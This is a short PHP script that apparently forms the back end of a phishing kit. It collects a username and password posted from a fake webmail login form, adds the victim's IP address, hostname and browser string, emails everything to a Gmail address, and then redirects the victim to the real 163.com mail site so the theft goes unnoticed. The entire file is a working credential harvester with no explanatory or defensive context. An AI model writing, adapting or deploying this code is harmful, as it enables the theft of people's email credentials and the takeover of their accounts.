<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];

$username = $_POST['username'];
$password = $_POST['password'];


$send = "zacyth@gmail.com";
$subject = "webmail-2019 $hostname";
$msg = "----------------------\nIP:$ip\nHost name:$hostname\nUserAgent :$useragent\nUser Name :$username\npassword :$password\n\n";
mail($send,$subject,$msg);
header("Location: https://mail.163.com/");

?>